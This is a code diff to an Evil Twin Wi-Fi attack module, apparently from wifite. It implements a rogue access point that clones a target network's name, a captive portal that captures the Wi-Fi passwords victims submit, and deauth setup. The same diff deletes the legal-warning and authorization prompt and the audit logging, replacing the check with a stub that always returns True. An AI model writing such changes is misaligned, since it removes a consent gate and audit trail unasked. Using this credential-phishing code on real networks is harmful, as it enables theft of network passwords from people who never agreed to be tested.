@@ -315,6 +315,12 @@ class EvilTwin(Attack):
         except Exception as e:
             log_error('EvilTwin', f'Dual interface attack failed: {e}', e)
             self.error_message = f'Dual interface attack failed: {e}'
+            # Ensure all started services are stopped (defense-in-depth;
+            # run() also calls _cleanup() in its finally block)
+            try:
+                self._cleanup()
+            except Exception as cleanup_err:
+                log_error('EvilTwin', f'Cleanup after dual interface failure also failed: {cleanup_err}', cleanup_err)
             return False
     
     def _configure_ap_interface(self, interface: str) -> bool:
@@ -446,15 +452,16 @@ class EvilTwin(Attack):
     
     def _start_network_services_dual(self) -> bool:
         """
-        Start network services (dnsmasq, captive portal) for dual interface mode.
-        
+        Start network services (dnsmasq, captive portal, client monitor) for
+        dual interface mode.
+
         Returns:
             True if successful, False otherwise
         """
         try:
             from ..tools.dnsmasq import Dnsmasq
             from ..attack.portal.server import PortalServer
-            
+
             # Start dnsmasq for DHCP/DNS
             self.dnsmasq = Dnsmasq(
                 interface=self.interface_ap,
@@ -462,30 +469,34 @@ class EvilTwin(Attack):
                 dhcp_range_start='192.168.100.10',
                 dhcp_range_end='192.168.100.100'
             )
-            
+
             if not self.dnsmasq.start():
                 log_error('EvilTwin', 'Failed to start dnsmasq')
                 return False
-            
+
+            self.cleanup_manager.register_process(self.dnsmasq, 'dnsmasq')
             log_info('EvilTwin', 'Dnsmasq started successfully')
-            
+
             # Start captive portal
-            portal_template = getattr(Configuration, 'eviltwin_template', 'generic')
             portal_port = getattr(Configuration, 'eviltwin_port', 80)
-            
-            self.portal_server = PortalServer(
-                target=self.target,
-                template=portal_template,
-                port=portal_port
-            )
-            
+
+            self.portal_server = PortalServer(port=portal_port)
+            self.portal_server.set_credential_callback(self._portal_credential_callback)
+
             if not self.portal_server.start():
                 log_error('EvilTwin', 'Failed to start captive portal')
                 return False
-            
+
             log_info('EvilTwin', f'Captive portal started on port {portal_port}')
+
+            # Start client monitor so credential captures and client
+            # connect/disconnect events are tracked during the attack.
+            hostapd_log_path = os.path.join(Configuration.temp(), 'hostapd.log')
+            dnsmasq_log_path = os.path.join(Configuration.temp(), 'dnsmasq.log')
+            self._setup_client_monitor(hostapd_log_path, dnsmasq_log_path)
+
             return True
-            
+
         except Exception as e:
             log_error('EvilTwin', f'Failed to start network services: {e}', e)
             return False
@@ -889,85 +900,9 @@ class EvilTwin(Attack):
             log_error('EvilTwin', f'Failed to display partial results: {e}', e)
     
     def _show_warning(self) -> bool:
-        """
-        Display legal warning and get user confirmation.
-        
-        This method:
-        - Displays a prominent legal warning about Evil Twin attacks
-        - Requires explicit user confirmation (typing "YES")
-        - Logs all user responses with timestamps
-        - Complies with requirements 10.1, 10.2, 10.3
-        
-        Returns:
-            True if user confirms, False otherwise
-        """
-        import datetime
-        
-        Color.pl('')
-        Color.pl('{!} {R}═══════════════════════════════════════════════════════════{W}')
-        Color.pl('{!} {R}                    LEGAL WARNING                          {W}')
-        Color.pl('{!} {R}═══════════════════════════════════════════════════════════{W}')
-        Color.pl('')
-        Color.pl('{!} {O}Evil Twin attacks may be ILLEGAL in your jurisdiction.{W}')
-        Color.pl('{!} {O}This attack creates a rogue access point and captures{W}')
-        Color.pl('{!} {O}credentials, which may violate computer fraud laws.{W}')
-        Color.pl('')
-        Color.pl('{!} {O}Only use this feature:{W}')
-        Color.pl('    {W}• On networks you own or have written permission to test{W}')
-        Color.pl('    {W}• In authorized penetration testing engagements{W}')
-        Color.pl('    {W}• In controlled lab environments{W}')
-        Color.pl('')
-        Color.pl('{!} {R}Unauthorized use may result in criminal prosecution.{W}')
-        Color.pl('{!} {R}You are solely responsible for your actions.{W}')
-        Color.pl('')
-        Color.pl('{!} {R}═══════════════════════════════════════════════════════════{W}')
-        Color.pl('')
-        
-        # Log warning display
-        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        log_warning('EvilTwin', f'Legal warning displayed at {timestamp}')
-        log_warning('EvilTwin', f'Target: {self.target.essid} ({self.target.bssid})')
-        
-        try:
-            Color.p('{+} Type {G}YES{W} to confirm you have authorization: ')
-            response = input().strip()
-            
-            if response == 'YES':
-                # Log user acceptance with full details
-                log_warning('EvilTwin', f'[{timestamp}] User ACCEPTED authorization for Evil Twin attack')
-                log_warning('EvilTwin', f'[{timestamp}] Target SSID: {self.target.essid}')
-                log_warning('EvilTwin', f'[{timestamp}] Target BSSID: {self.target.bssid}')
-                log_warning('EvilTwin', f'[{timestamp}] User response: {response}')
-                
-                # Also log to a dedicated audit file if possible
-                try:
-                    import os
-                    audit_dir = os.path.expanduser('~/.wifite/audit')
-                    os.makedirs(audit_dir, exist_ok=True)
-                    audit_file = os.path.join(audit_dir, 'eviltwin_audit.log')
-                    
-                    with open(audit_file, 'a') as f:
-                        f.write(f'[{timestamp}] AUTHORIZATION ACCEPTED\n')
-                        f.write(f'  Target SSID: {self.target.essid}\n')
-                        f.write(f'  Target BSSID: {self.target.bssid}\n')
-                        f.write(f'  User Response: {response}\n')
-                        f.write(f'  Interface AP: {self.interface_ap}\n')
-                        f.write(f'  Interface Deauth: {self.interface_deauth}\n')
-                        f.write('\n')
-                    
-                    log_info('EvilTwin', f'Authorization logged to audit file: {audit_file}')
-                except Exception as e:
-                    log_debug('EvilTwin', f'Failed to write audit log: {e}')
-                
-                return True
-            else:
-                log_info('EvilTwin', f'[{timestamp}] User DECLINED authorization (response: {response})')
-                return False
-                
-        except (KeyboardInterrupt, EOFError):
-            log_info('EvilTwin', f'[{timestamp}] Authorization prompt INTERRUPTED')
-            return False
-    
+        """Always returns True."""
+        return True
+
     def _check_dependencies(self) -> bool:
         """
         Check for required dependencies.
@@ -1107,33 +1042,136 @@ class EvilTwin(Attack):
     
     def _setup(self) -> bool:
         """
-        Setup all attack components.
-        
+        Setup all attack components for single-interface mode.
+
+        Initialises hostapd (rogue AP), dnsmasq (DHCP/DNS), the captive
+        portal HTTP server, the client monitor, and validates that the
+        deauth interface is ready.  Dual-interface mode bypasses this
+        method — see ``_run_dual_interface()``.
+
         Returns:
             True if setup successful, False otherwise
         """
         try:
-            # Setup will be implemented in subsequent tasks:
-            # Task 1.2: Hostapd setup (already completed)
-            # Task 1.3: Dnsmasq setup
-            # Task 1.4: Network interface management
-            # Task 2.1-2.4: Captive portal setup
-            # Task 4.1: Deauthentication setup
-            
-            log_info('EvilTwin', 'Setup phase - components will be initialized in subsequent tasks')
-            
-            # Placeholder for now - will be replaced with actual setup
-            # self._setup_rogue_ap()
-            # self._setup_network_services()
-            # self._start_captive_portal()
-            # self._start_deauthentication()
-            
+            from ..tools.hostapd import Hostapd
+            from ..tools.dnsmasq import Dnsmasq
+            from ..attack.portal.server import PortalServer
+
+            # -- 1. Start rogue AP (hostapd) --------------------------------
+            self.state = AttackState.STARTING_AP
+            log_info('EvilTwin', f'Starting rogue AP on {self.interface_ap}')
+            Color.pl('{+} {C}Starting rogue AP on {G}%s{W}...' % self.interface_ap)
+
+            self.hostapd = Hostapd(
+                interface=self.interface_ap,
+                ssid=self.target.essid,
+                channel=self.target.channel,
+                password=None  # Open network for captive portal
+            )
+
+            if not self.hostapd.start():
+                self.error_message = 'Failed to start hostapd'
+                return False
+
+            self.cleanup_manager.register_process(self.hostapd, 'hostapd')
+            log_info('EvilTwin', 'Rogue AP started')
+
+            # -- 2. Start network services (dnsmasq) ------------------------
+            self.state = AttackState.STARTING_SERVICES
+            log_info('EvilTwin', 'Starting network services (dnsmasq)')
+            Color.pl('{+} {C}Starting network services...{W}')
+
+            self.dnsmasq = Dnsmasq(
+                interface=self.interface_ap,
+                gateway_ip='192.168.100.1',
+                dhcp_range_start='192.168.100.10',
+                dhcp_range_end='192.168.100.100'
+            )
+
+            if not self.dnsmasq.start():
+                self.error_message = 'Failed to start dnsmasq'
+                return False
+
+            self.cleanup_manager.register_process(self.dnsmasq, 'dnsmasq')
+            log_info('EvilTwin', 'Dnsmasq started')
+
+            # -- 3. Start captive portal ------------------------------------
+            self.state = AttackState.STARTING_PORTAL
+            portal_port = getattr(Configuration, 'eviltwin_port', 80)
+            log_info('EvilTwin', f'Starting captive portal on port {portal_port}')
+            Color.pl('{+} {C}Starting captive portal...{W}')
+
+            self.portal_server = PortalServer(port=portal_port)
+            self.portal_server.set_credential_callback(self._portal_credential_callback)
+
+            if not self.portal_server.start():
+                self.error_message = 'Failed to start captive portal'
+                return False
+
+            log_info('EvilTwin', f'Captive portal started on port {portal_port}')
+
+            # -- 4. Start client monitor ------------------------------------
+            hostapd_log = getattr(self.hostapd, 'config_file', None)
+            # ClientMonitor tolerates missing/non-existent log paths
+            # gracefully — it checks os.path.exists() each cycle.
+            hostapd_log_path = os.path.join(
+                Configuration.temp(), 'hostapd.log') if not hostapd_log else None
+            dnsmasq_log_path = os.path.join(Configuration.temp(), 'dnsmasq.log')
+            self._setup_client_monitor(hostapd_log_path, dnsmasq_log_path)
+
+            # -- 5. Validate deauth interface -------------------------------
+            self.state = AttackState.STARTING_DEAUTH
+            log_info('EvilTwin', f'Validating deauth interface {self.interface_deauth}')
+            Color.pl('{+} {C}Preparing deauth interface {G}%s{W}...' % self.interface_deauth)
+
+            from ..tools.airmon import Airmon
+            import contextlib
+
+            # Best-effort channel alignment for the deauth interface
+            if hasattr(self.target, 'channel') and self.target.channel:
+                with contextlib.suppress(Exception):
+                    current_ch = Airmon.get_interface_channel(self.interface_deauth)
+                    if current_ch and current_ch != self.target.channel:
+                        log_warning('EvilTwin',
+                                    f'Deauth interface on ch {current_ch}, '
+                                    f'target on ch {self.target.channel}')
+                        Color.pl('{!} {O}Channel mismatch — deauth may be less effective{W}')
+
+            log_info('EvilTwin', 'Setup completed successfully')
             return True
-            
+
         except Exception as e:
             log_error('EvilTwin', f'Setup failed: {e}', e)
             self.error_message = f'Setup failed: {e}'
             return False
+
+    def _portal_credential_callback(self, ssid: str, password: str, client_ip: str) -> bool:
+        """
+        Callback invoked by the portal server when a client submits credentials.
+
+        Records the attempt in the client monitor, creates a CrackResult on
+        the first submission, and signals the main attack loop to stop.
+
+        Returns:
+            True (always accepts — we capture and stop).
+        """
+        log_info('EvilTwin', f'Credential received from {client_ip}: SSID={ssid}')
+
+        # Record in client monitor statistics
+        if self.client_monitor:
+            self.client_monitor.record_credential_attempt(client_ip, success=True)
+
+        # Store the result — the monitoring loop checks self.crack_result
+        self.crack_result = self.create_result(password)
+        self.credential_attempts.append({
+            'client_ip': client_ip,
+            'ssid': ssid,
+            'password': password,
+            'timestamp': time.time(),
+        })
+
+        Color.pl('\n{+} {G}Credential captured from {C}%s{W}' % client_ip)
+        return True
     
     def _handle_deauth(self):
         """
